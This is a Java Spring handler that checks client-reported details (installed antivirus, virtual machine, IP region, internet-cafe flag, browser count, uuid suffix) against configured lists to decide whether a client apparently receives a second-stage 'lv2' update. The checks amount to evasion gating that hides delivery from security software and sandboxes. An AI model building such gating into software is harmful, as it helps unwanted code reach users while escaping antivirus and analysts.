package com.fanmila.handlers;

import com.alibaba.fastjson.JSONObject;
import com.fanmila.model.ClickHandlerInfo;
import com.fanmila.model.URLHandlerContext;
import com.fanmila.model.cache.CacheConstant;
import com.fanmila.service.impl.BaseRedisServiceImpl;
import com.fanmila.util.analyzer.URLAnalyzerManager;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.util.Map;

/**
 * 
 * @author zhenyuanzi
 *
 */
@Component
public class CLTReasonHandler extends CltApiURLHandler{
	
	@Autowired
	private BaseRedisServiceImpl baseRedisService;// = ContextUtils.getBean(BaseRedisServiceImpl.class);

	
	@Autowired
	private URLAnalyzerManager urlAnalyzerManager;
	
	@Override
	public String getRedirectURL(URLHandlerContext context, ClickHandlerInfo handlerInfo) {
		

		String durl = "aaaaa";
		String reasonStr = "succ";
		JSONObject responseInfo = new JSONObject();
		try {
			//sid为必传参数
			/*if(!context.getRequestData().containsKey("sid")||StringUtils.isBlank(context.getRequestData().getString("sid"))){
				responseInfo.put("succ", 0);
				//responseInfo.put("isSuccess", false);
				//responseInfo.put("msg", "sid is null!");
				return null;
			}*/
			String productId = context.getRequestData().getString("productId");
			productId = StringUtils.isBlank(productId)?"1":productId;
			//获取后台配置的升级信息
			Map<String, String> lastUpdateInfo = baseRedisService.getMap(CacheConstant.CLT_REASON_INFO + productId);
			//获取客户端传递参数
			//版本信息
			String version = context.getRequestData().containsKey("version")?context.getRequestData().getString("version"):"";
			//操作系统
			String os = context.getRequestData().containsKey("os")?context.getRequestData().getString("os"):"";
			//用户标识uuid
			String uuid = context.getRequestData().containsKey("uuid")?context.getRequestData().getString("uuid"):"";
			String lastuuid = uuid.length()>1?uuid.substring(uuid.length()-1):"";
			//渠道信息
			String channel = context.getRequestData().containsKey("channel")?context.getRequestData().getString("channel"):"";
			//活跃天数
			Integer activeDays = context.getRequestData().containsKey("activeDays")?context.getRequestData().getInteger("activeDays"):0;

			//String enemy = context.getRequestData().containsKey("enemy")?context.getRequestData().getString("enemy"):"";
			boolean a = context.getRequestData().containsKey("antiVirus");

			Integer antiVirus = context.getRequestData().containsKey("antiVirus")?context.getRequestData().getInteger("antiVirus"):0;

			Integer browserList = context.getRequestData().containsKey("browserList")?context.getRequestData().getInteger("browserList"):0;

			String virtualMachine = context.getRequestData().containsKey("virtualMachine")?context.getRequestData().getString("virtualMachine"):"";

			String ipCode = context.getRequestData().containsKey("ipCode")?context.getRequestData().getString("ipCode"):"";
			String isBar = context.getRequestData().containsKey("isBar")?context.getRequestData().getString("isBar"):"";


			//渠道匹配,包含就不做lv2，就返回
			if(isHaveA(lastUpdateInfo.get("channel"), channel)){
				responseInfo.put(reasonStr, "a");
				return durl;
			}
			//活跃天数匹配
			if( lastUpdateInfo.get("active_day") == null || Integer.valueOf(lastUpdateInfo.get("active_day")) > activeDays){
				responseInfo.put(reasonStr, "b");
				return durl;
			}
			//竞品判断
			//if()

			//杀软 反向匹配
			String antiVirusBin = Integer.toBinaryString(antiVirus);
			String [] antiVirusBinl = antiVirusBin.split("");
			Integer num = antiVirusBinl.length;
			for(int j =0; j<num; j++){
				String i = antiVirusBinl[j];
				if(i.equals("1")){
					if(isHave(lastUpdateInfo.get("anti_virus"), CacheConstant.ANTIVIRUS_LIST.get(num-j-1))){
						responseInfo.put(reasonStr, "d");
						return durl;
					}
				}else{
					continue;
				}
			}

			//浏览器个数，小于配置值
			String browserListBin = Integer.toBinaryString(browserList);
			String [] browserListl = browserListBin.split("");
			Integer browserNum = 0;
			for(String b : browserListl){
				browserNum += Integer.valueOf(b);
			}
			if(browserNum > Integer.valueOf(lastUpdateInfo.get("browser_num"))){
				responseInfo.put(reasonStr, "e");
				return durl;
			}

			//虚拟机 反向匹配
			if(isHaveA(lastUpdateInfo.get("virtual_machine"), virtualMachine)){
					responseInfo.put(reasonStr, "f");
					return durl;
			}

			//ip 反向匹配
			if(isHaveA(lastUpdateInfo.get("ip_code"), ipCode)){
				responseInfo.put(reasonStr, "g");
				return durl;
			}

			//操作系统 反向匹配
			/*String osBin = Integer.toBinaryString(os);
			String [] osBinl = osBin.split("");
			String [] osConfig = lastUpdateInfo.get("os").split(",");
			if(osConfig.length>=1){
				for (String osconf : osConfig){
					Integer i = Integer.valueOf(osconf);
					if(osBinl.length>=i && osBinl[i-1].equals("1")){
						responseInfo.put(reasonStr, "h");
						return durl;
					}
				}
			}*/
			if(isHaveA(lastUpdateInfo.get("os"), os)){
				responseInfo.put(reasonStr, "h");
				return durl;
			}

			//uuid  反向匹配
			if(isHaveA(lastUpdateInfo.get("lastuuid"), lastuuid)){
				responseInfo.put(reasonStr, "i");
				return durl;
			}

			//网吧值匹配  反向匹配
			if(lastUpdateInfo.get("is_bar").equals(isBar)){
				responseInfo.put(reasonStr, "j");
				return durl;
			}

			//版本匹配,包含就不做lv2，就返回
			if(isHaveA(lastUpdateInfo.get("version"), version)){
				responseInfo.put(reasonStr, "k");
				return durl;
			}

			responseInfo.put(reasonStr, "z");

		} catch (Exception e) {
			responseInfo.put(reasonStr, '0');
			//responseInfo.put("isSuccess", false);
			//responseInfo.put("msg", "Error!");
			e.printStackTrace();
			return null;
		}finally{
			//responseInfo.put(reasonStr, '0');
			context.setInfo(responseInfo);
		}
		
		return durl;
	}

	
	public static void main(String[] args) {
		Integer a = 12;
		String b = Integer.toBinaryString(12);
		for (String i : b.split("")){
			System.out.println(i);
		}
		System.out.println(b.split(""));
		/*String uuid = "1234567890s";
		Calendar cal = Calendar.getInstance();
		System.out.println(cal);
		int hour =  cal.get(Calendar.HOUR_OF_DAY);
		System.out.println(hour);
		System.out.println(uuid.substring(uuid.length()-1));
		System.out.println("1.0.1".compareTo("1.0.0"));*/
		
	}



}
